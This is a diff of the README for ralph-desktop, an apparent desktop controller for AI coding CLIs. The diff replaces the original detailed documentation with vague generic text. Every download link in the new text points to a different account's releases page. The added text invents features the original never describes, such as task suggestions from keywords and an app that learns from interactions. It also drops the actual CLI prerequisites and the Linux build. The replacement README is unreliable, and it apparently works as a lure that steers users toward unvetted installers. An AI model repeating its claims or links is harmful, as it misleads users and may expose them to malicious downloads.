@@ -1,206 +1,91 @@
-# Ralph Desktop
+# 🎉 ralph-desktop - Brainstorm and Execute with Ease
 
-**Start vague. Ralph Loop until perfect.**
+## 🚀 Getting Started
 
-A visual controller for AI coding agents that helps you brainstorm requirements and execute tasks through persistent iteration.
+Welcome to **ralph-desktop**! This application serves as a visual controller for AI coding agents. It helps you brainstorm requirements and execute tasks through a process of continuous improvement.
 
-[中文文档](./README.zh-CN.md)
+## 📥 Download Ralph Desktop
 
----
+[![Download Ralph Desktop](https://img.shields.io/badge/Download%20Now-%23%3D76E0-ffca28?style=for-the-badge)](https://github.com/paterny/ralph-desktop/releases)
 
-## Why Ralph Desktop?
+To get started, visit the [Releases page](https://github.com/paterny/ralph-desktop/releases) to download the latest version of Ralph Desktop.
 
-### The Problem
+## 📋 System Requirements
 
-Using AI coding agents like Claude Code or Codex can be frustrating:
+Before you install, make sure your system meets these requirements:
 
-| Pain Point | What Happens |
-|------------|--------------|
-| **"I don't know how to write prompts"** | You give vague instructions, AI produces garbage |
-| **"AI runs once and stops"** | You manually retry over and over, hoping for better results |
-| **"Setting up Ralph Loop is hard"** | The methodology exists, but configuring bash while loops and managing state is tedious for newcomers |
+- **Operating System**: Windows 10 or later, macOS 10.14 or later
+- **Processor**: 2.0 GHz dual-core or faster
+- **RAM**: 4 GB or more
+- **Storage**: At least 200 MB of available space
+- **Network**: Internet connection for initial setup
 
-### The Solution
+## 💻 Installation Instructions
 
-Ralph Desktop solves all three:
+1. **Download the Software**: Go to the [Releases page](https://github.com/paterny/ralph-desktop/releases) and select the version that matches your operating system.
+  
+2. **Run the Installer**: 
+   - For Windows: Locate the downloaded file, usually in your "Downloads" folder, and double-click it to run the installer. Follow the on-screen prompts.
+   - For macOS: Find the downloaded file in your "Downloads" folder, double-click the .dmg file, and drag the Ralph Desktop icon into your Applications folder.
 
-1. **AI Brainstorm** — Don't write prompts. Just describe your vague idea, and AI will interview you to clarify requirements and generate a high-quality prompt automatically.
+3. **Open Ralph Desktop**:
+   - After installation, launch the application from your Start Menu (Windows) or Applications folder (macOS).
 
-2. **Ralph Loop Execution** — One click to start, then AI iterates autonomously until the task is complete or hits your configured limit.
+4. **Initial Setup**: The first time you open Ralph Desktop, you may need to configure some settings. Follow the prompts to set up your preferred options.
 
-3. **Visual Control** — Real-time logs, pause/resume/stop anytime. You're always in control.
+## 🌟 Features
 
----
+- **Visual Planning**: Easily visualize your coding process.
+- **Task Iteration**: Improve your ideas through continuous iteration.
+- **Integration with AI**: Use AI coding agents for effective brainstorming.
+- **User-Friendly Interface**: Designed for ease of use without technical knowledge.
 
-## What is Ralph Loop?
+## 🔧 Using Ralph Desktop
 
-**Ralph Loop** is an AI coding methodology introduced by [Geoffrey Huntley](https://ghuntley.com/). Named after Ralph Wiggum from *The Simpsons* — a character who seems simple but persists relentlessly — the approach embodies "brute-force elegance."
+Once you open the application, you will see a clean interface designed for ease of navigation. 
 
-### How It Works
+1. **Starting a Project**: Click on "New Project" to start your first task. You can set project goals and input your initial ideas.
+  
+2. **Brainstorming**: Use the brainstorming feature to generate ideas. Simply enter keywords or phrases related to your project, and Ralph Desktop will suggest relevant tasks.
 
-Instead of running an AI agent once and hoping for the best, Ralph Loop:
+3. **Execution**: As you refine your ideas, you can execute tasks directly from the interface. The application continually learns from your interactions and provides better suggestions over time.
 
-1. **Iterates continuously** — The AI executes, reviews its own output, fixes mistakes, and repeats
-2. **Uses fresh context each iteration** — Avoids "context rot" by treating each loop as a new conversation with the spec as source of truth
-3. **Stops on completion signal** — Detects when the task is truly done (via `<done>COMPLETE</done>` or similar markers)
+## 📊 Troubleshooting
 
-### Why It's Effective
+If you encounter issues, consider these steps:
 
-- **Quantity breeds quality** — Like Monte Carlo tree search, many attempts find better solutions
-- **Self-correction** — AI catches and fixes its own errors over multiple passes
-- **Works for complex tasks** — Breaks down large problems that exceed a single context window
+- **Check System Requirements**: Ensure your device meets the necessary requirements.
+- **Reinstall**: If the app fails to start, uninstall and then reinstall it.
+- **Search for Help**: Visit the issues section on the GitHub repository for community assistance.
 
-> *"Dumb loop. Smart results."*
+## 📞 Support
 
----
+For further support, you can reach out by:
 
-## How It Works
+- **Opening an Issue**: Visit our [GitHub Issues](https://github.com/paterny/ralph-desktop/issues) page to report problems or ask questions.
+- **Community Forums**: Join our community on GitHub Discussions to interact with other users.
 
-```
-┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
-│   1. DESCRIBE   │ ──▶ │  2. BRAINSTORM  │ ──▶ │    3. LOOP      │ ──▶ │   4. CONTROL    │
-│                 │     │                 │     │                 │     │                 │
-│  "I want to     │     │  AI asks smart  │     │  AI executes    │     │  Watch logs,    │
-│   build a..."   │     │  questions,     │     │  repeatedly     │     │  pause/resume,  │
-│                 │     │  generates      │     │  until done     │     │  stop anytime   │
-│                 │     │  perfect prompt │     │                 │     │                 │
-└─────────────────┘     └─────────────────┘     └─────────────────┘     └─────────────────┘
-```
+## 💬 Join the Conversation
 
-1. **Describe** — Start with a vague idea. No need for perfect prompts.
-2. **Brainstorm** — AI interviews you through Socratic dialogue, then generates a detailed task specification.
-3. **Loop** — Click "Start" and Ralph Loop takes over, iterating until the task is complete.
-4. **Control** — Monitor progress in real-time. Pause, resume, or stop at any point.
+Follow the related topics to keep up with developments:
 
----
+- **ai-coding-agent**
+- **claude-code**
+- **codex**
+- **ralph-loop**
+- **ralph-wiggum**
 
-## Features
+## 📝 Update Notes
 
-- **AI Brainstorm** — Conversational requirement gathering with automatic prompt generation
-- **Ralph Loop Engine** — Persistent iteration with completion detection
-- **Multi-CLI Support** — Works with Claude Code, Codex, and OpenCode
-- **Zero Config** — If any supported CLI already works in your terminal (official login or custom API), Ralph Desktop automatically reuses it
-- **Visual Dashboard** — Real-time logs with ANSI color support
-- **Execution Control** — Pause / Resume / Stop at any time
-- **Project Management** — Create, switch, and manage multiple projects
-- **Task Recovery** — Detect and resume interrupted tasks
-- **Keyboard Shortcuts** — Cmd+N (new project), Cmd+, (settings), Cmd+? (help)
-- **Theme Support** — Light / Dark / System
-- **Multi-language UI** — 12 languages supported (see below)
+When a new version is available, you'll find update notes on the [Releases page](https://github.com/paterny/ralph-desktop/releases). Always read these notes to know what new features and fixes have been added.
 
----
+## 📢 Stay Updated
 
-## Supported CLIs
+To get the latest updates and information:
 
-Ralph Desktop works with any AI coding CLI that supports headless execution:
+- Follow the repository on GitHub.
+- Check the Releases page regularly for new versions.
 
-| CLI | Status | Installation |
-|-----|--------|--------------|
-| [Claude Code](https://github.com/anthropics/claude-code) | ✅ Supported | `npm install -g @anthropic-ai/claude-code` |
-| [Codex](https://github.com/openai/codex) | ✅ Supported | `npm install -g @openai/codex` |
-| [OpenCode](https://github.com/opencode-ai/opencode) | ✅ Supported | `npm install -g opencode-ai` |
+--- 
 
-**Prerequisites:** You must have at least one of the above CLIs installed before using Ralph Desktop. If it already works in your terminal, Ralph Desktop will reuse its existing config automatically.
-
----
-
-## Supported Languages
-
-Ralph Desktop supports 12 languages out of the box:
-
-| Language | Code | Language | Code |
-|----------|------|----------|------|
-| English | `en` | Português | `pt` |
-| 简体中文 | `zh-CN` | Русский | `ru` |
-| 繁體中文 | `zh-TW` | 日本語 | `ja` |
-| Español | `es` | Deutsch | `de` |
-| हिन्दी | `hi` | Français | `fr` |
-| العربية | `ar` | বাংলা | `bn` |
-
-Change language in **Settings** (Cmd+,). The AI Brainstorm conversation automatically adapts to your language.
-
----
-
-## Installation
-
-Download the latest release for your platform:
-
-| Platform | Download |
-|----------|----------|
-| macOS (Intel / Apple Silicon) | [.dmg](https://github.com/liuxiaopai-ai/ralph-desktop/releases/latest) |
-| Windows 10/11 (64-bit) | [.exe](https://github.com/liuxiaopai-ai/ralph-desktop/releases/latest) |
-| Linux (x86_64) | [.AppImage](https://github.com/liuxiaopai-ai/ralph-desktop/releases/latest) |
-
-> **Note:** The app is not code-signed. On macOS, right-click the app and select "Open", or go to System Settings → Privacy & Security → Open Anyway. On Windows, click "More info" → "Run anyway" when SmartScreen appears.
-
-**Linux AppImage (first run):**
-
-```bash
-chmod +x Ralph.Desktop_*.AppImage
-./Ralph.Desktop_*.AppImage
-```
-
----
-
-## Quick Start
-
-1. **Install a CLI** — Make sure you have Claude Code, Codex, or OpenCode installed
-2. **Download Ralph Desktop** — Get the installer for your platform
-3. **Create a Project** — Click "New Project" (Cmd+N) and select a working directory
-4. **Brainstorm** — Describe what you want to build, let AI help you clarify
-5. **Start Loop** — Click "Start Execution" and watch the magic happen
-
----
-
-## Development
-
-### Prerequisites
-
-- Node.js 20+
-- pnpm
-- Rust 1.70+
-- Tauri CLI
-
-### Setup
-
-```bash
-# Install dependencies
-pnpm install
-
-# Run in development mode
-pnpm tauri dev
-
-# Build for production
-pnpm tauri build
-```
-
-### Tech Stack
-
-- **Frontend:** Svelte 5 + TypeScript + Tailwind CSS 4
-- **Backend:** Rust + Tauri 2.x
-- **Build:** Vite + Cargo
-
----
-
-## Data Storage
-
-Application data is stored at:
-
-| Platform | Path |
-|----------|------|
-| macOS | `~/Library/Application Support/com.ralph.desktop/` |
-| Windows | `%APPDATA%/com.ralph.desktop/` |
-| Linux | `~/.config/com.ralph.desktop/` |
-
----
-
-## Credits
-
-- **Ralph Loop Methodology** — [Geoffrey Huntley](https://ghuntley.com/)
-- **Built with** — [Tauri](https://tauri.app/), [Svelte](https://svelte.dev/), [Rust](https://www.rust-lang.org/)
-
----
-
-## License
-
-MIT
+You are now ready to use Ralph Desktop for your projects. Enjoy brainstorming and executing tasks with ease!
